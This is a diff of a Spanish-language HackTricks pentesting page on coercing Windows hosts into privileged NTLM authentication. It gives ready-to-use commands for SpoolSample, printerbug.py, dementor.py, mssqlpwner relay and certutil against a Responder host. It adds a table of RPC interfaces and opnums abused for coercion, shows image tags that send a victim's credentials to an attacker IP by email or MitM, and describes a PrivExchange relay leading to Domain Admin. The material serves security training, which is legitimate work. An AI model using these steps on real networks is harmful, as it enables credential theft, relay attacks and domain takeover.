@@ -1,25 +1,25 @@
-# Forzar la Autenticación Privilegiada NTLM
+# Force NTLM Privileged Authentication
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** codificados en C# utilizando el compilador MIDL para evitar dependencias de terceros.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** escritos en C# usando el compilador MIDL para evitar dependencias de terceros.
 
-## Abuso del Servicio de Spooler
+## Spooler Service Abuse
 
-Si el servicio _**Print Spooler**_ está **habilitado**, puedes usar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Controlador de Dominio una **actualización** sobre nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
-Ten en cuenta que cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **usará la cuenta de computadora** en esta autenticación.
+Si el servicio _**Print Spooler**_ está **habilitado**, puedes usar algunas credenciales AD ya conocidas para **solicitar** al servidor de impresión del Domain Controller una **actualización** sobre nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
+Nota: cuando una impresora envía la notificación a un sistema arbitrario, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **usará la cuenta del equipo** en esa autenticación.
 
-### Encontrar Servidores Windows en el dominio
+### Finding Windows Servers on the domain
 
-Usando PowerShell, obtén una lista de máquinas Windows. Los servidores suelen ser prioridad, así que enfoquémonos allí:
+Usando PowerShell, obtén una lista de máquinas Windows. Los servidores suelen ser prioritarios, así que centrémonos ahí:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Encontrar servicios de Spooler escuchando
+### Detectar servicios Spooler que están escuchando
 
-Usando un @mysmartlogin (Vincent Le Toux) ligeramente modificado [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica si el Servicio de Spooler está escuchando:
+Usando una versión ligeramente modificada de SpoolerScanner de @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), comprueba si el Spooler Service está escuchando:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -28,36 +28,73 @@ También puedes usar rpcdump.py en Linux y buscar el protocolo MS-RPRN.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Pida al servicio que se autentique contra un host arbitrario
+### Pedir al servicio que se autentique contra un host arbitrario
 
-Puede compilar[ **SpoolSample desde aquí**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Puedes compilar [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-o usa [**dementor.py de 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
+o usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Combinando con Delegación No Restringida
+### Combinando con Unconstrained Delegation
 
-Si un atacante ya ha comprometido una computadora con [Delegación No Restringida](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra esta computadora**. Debido a la delegación no restringida, el **TGT** de la **cuenta de computadora de la impresora** será **guardado en** la **memoria** de la computadora con delegación no restringida. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).
+Si un atacante ya ha comprometido un equipo con [Unconstrained Delegation](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra ese equipo**. Debido a la unconstrained delegation, el **TGT** de la **computer account of the printer** será **guardado en** la **memoria** del equipo con unconstrained delegation. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).
 
-## Autenticación Forzada RCP
+## RPC Force authentication
 
-{{#ref}}
-https://github.com/p0dalirius/Coercer
-{{#endref}}
+[Coercer](https://github.com/p0dalirius/Coercer)
+
+### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
+- MS-RPRN (Print System Remote Protocol)
+- Pipe: \\PIPE\\spoolss
+- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
+- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
+- Tools: PrinterBug / PrintNightmare-family
+- MS-PAR (Print System Asynchronous Remote)
+- Pipe: \\PIPE\\spoolss
+- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
+- Opnum: 0 RpcAsyncOpenPrinter
+- MS-EFSR (Encrypting File System Remote Protocol)
+- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
+- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
+- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
+- Tool: PetitPotam
+- MS-DFSNM (DFS Namespace Management)
+- Pipe: \\PIPE\\netdfs
+- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
+- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
+- Tool: DFSCoerce
+- MS-FSRVP (File Server Remote VSS)
+- Pipe: \\PIPE\\FssagentRpc
+- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
+- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
+- Tool: ShadowCoerce
+- MS-EVEN (EventLog Remoting)
+- Pipe: \\PIPE\\even
+- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
+- Opnum: 9 ElfrOpenBELW
+- Tool: CheeseOunce
+
+Nota: Estos métodos aceptan parámetros que pueden contener una ruta UNC (por ejemplo, `\\attacker\share`). Cuando se procesan, Windows se autenticará (contexto máquina/usuario) hacia esa UNC, permitiendo la captura o el relay de NetNTLM.
+
+### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
+- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
+- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
+- Effect: el objetivo intenta abrir la ruta de backup del log suministrada y se autentica con la UNC controlada por el atacante.
+- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.
 
 ## PrivExchange
 
-El ataque `PrivExchange` es el resultado de un defecto encontrado en la **función `PushSubscription` del Exchange Server**. Esta función permite que el servidor de Exchange sea forzado por cualquier usuario de dominio con un buzón para autenticarse en cualquier host proporcionado por el cliente a través de HTTP.
+El ataque `PrivExchange` es resultado de un fallo encontrado en la **Exchange Server `PushSubscription` feature**. Esta característica permite que el servidor Exchange sea forzado por cualquier usuario de dominio con un mailbox a autenticarse contra cualquier host proporcionado por el cliente vía HTTP.
 
-Por defecto, el **servicio de Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en el dominio antes de la Actualización Acumulativa de 2019**). Este defecto puede ser explotado para habilitar el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el reenvío a LDAP no es posible, este defecto aún puede ser utilizado para reenviar y autenticarse en otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.
+Por defecto, el **servicio Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene privilegios WriteDacl en el dominio pre-2019 Cumulative Update). Este fallo puede explotarse para permitir el **relay de información hacia LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el relaying a LDAP no sea posible, este fallo puede aún utilizarse para relayar y autenticarse contra otros hosts dentro del dominio. La explotación exitosa de este ataque concede acceso inmediato al Domain Admin con cualquier cuenta de usuario de dominio autenticada.
 
-## Dentro de Windows
+## Inside Windows
 
-Si ya estás dentro de la máquina Windows, puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:
+Si ya estás dentro de la máquina Windows puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:
 
 ### Defender MpCmdRun
 ```bash
@@ -78,7 +115,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+O usa esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
@@ -86,11 +123,11 @@ Es posible usar certutil.exe lolbin (binario firmado por Microsoft) para forzar 
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-## Inyección HTML
+## HTML injection
 
-### A través de correo electrónico
+### Vía email
 
-Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que deseas comprometer, podrías simplemente enviarle un **correo electrónico con una imagen de 1x1** como
+Si conoces la **email address** del usuario que inicia sesión en una máquina que quieres comprometer, podrías simplemente enviarle un **email con una 1x1 image** como
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -98,20 +135,29 @@ y cuando lo abra, intentará autenticarse.
 
 ### MitM
 
-Si puedes realizar un ataque MitM a una computadora e inyectar HTML en una página que él visualizará, podrías intentar inyectar una imagen como la siguiente en la página:
+Si puedes realizar un ataque MitM a un equipo e inyectar HTML en una página que vaya a visualizar, podrías intentar inyectar una imagen como la siguiente en la página:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Otras formas de forzar y pescar la autenticación NTLM
+## Otras formas de forzar y phish la autenticación NTLM
 
 
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-## Rompiendo NTLMv1
+## Cracking NTLMv1
 
-Si puedes capturar [desafíos NTLMv1 lee aquí cómo romperlos](../ntlm/index.html#ntlmv1-attack).\
-_Recuerda que para romper NTLMv1 necesitas establecer el desafío de Responder en "1122334455667788"_
+Si puedes capturar [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
+_Recuerda que, para crackear NTLMv1, necesitas configurar el Responder challenge a "1122334455667788"_
+
+## Referencias
+- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
+- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
+- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
+- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
+- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
+- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
 
 {{#include ../../banners/hacktricks-training.md}}
